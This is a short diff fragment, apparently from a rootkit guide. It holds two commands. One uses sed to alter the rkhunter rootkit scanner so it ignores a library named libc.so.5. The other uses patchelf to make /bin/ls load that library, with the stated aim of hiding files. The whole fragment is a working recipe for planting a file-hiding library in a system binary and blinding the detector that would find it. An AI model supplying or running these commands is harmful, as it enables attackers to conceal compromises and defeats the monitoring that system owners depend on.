@@ -14,6 +14,10 @@ To:
 
 try_trace "$RTLD" "$file" | grep -v libc.so.5 || result=1
 
+Try this:
+
+sed -i 's|^try_trace "\$RTLD" "\$file" \|\| result=1$|try_trace "$RTLD" "$file" | grep -v libc.so.5 || result=1|' /usr/bin/rkhunter
+
 Patch here to hide files:
 
 patchelf --add-needed /lib/x86_64-linux-gnu/libc.so.5 /bin/ls
